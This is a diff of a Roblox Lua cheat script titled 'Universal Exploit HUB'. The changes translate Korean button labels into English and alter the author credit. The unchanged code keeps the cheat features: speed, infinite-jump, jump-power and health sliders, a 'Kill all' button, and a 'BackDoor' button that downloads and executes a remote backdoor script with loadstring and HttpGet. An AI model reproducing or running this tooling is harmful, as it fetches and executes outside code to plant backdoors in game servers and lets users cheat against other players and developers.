@@ -3,7 +3,7 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
     Name = "Universal Exploit HUB",
     LoadingTitle = "잼민겜 Fucking",
-    LoadingSubtitle = "by 전두광",
+    LoadingSubtitle = "by DJP",
     ConfigurationSaving = {
        Enabled = true,
        FolderName = nil, -- Create a custom folder for your hub/game
@@ -47,7 +47,7 @@ local Window = Rayfield:CreateWindow({
 
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "스피드",
+    Name = "Speed",
     Range = {0, 350},
     Increment = 10,
     Suffix = "Speed",
@@ -59,7 +59,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = PlayerTab:CreateButton({
-    Name = "축지법",
+    Name = "Infjump",
     Callback = function()
         _G.infinjump = not _G.infinjump
 
@@ -88,7 +88,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "점프",
+    Name = "JumpPower",
     Range = {1, 350},
     Increment = 1,
     Suffix = "Power",
@@ -100,7 +100,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "체력",
+    Name = "Health",
     Range = {1, 99999999999},
     Increment = 1,
     Suffix = "Health",
@@ -126,14 +126,14 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = scriptTab:CreateButton({
-    Name = "백도어 심기",
+    Name = "BackDoor",
     Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
     end,
  })
 
  local Button = scriptTab:CreateButton({
-    Name = "짭부대 킬올 [Acs, Ce]",
+    Name = "Acs, Ce Kill all",
     Callback = function()
       local Players = game:GetService("Players")
       local LocalPlayer = Players.LocalPlayer
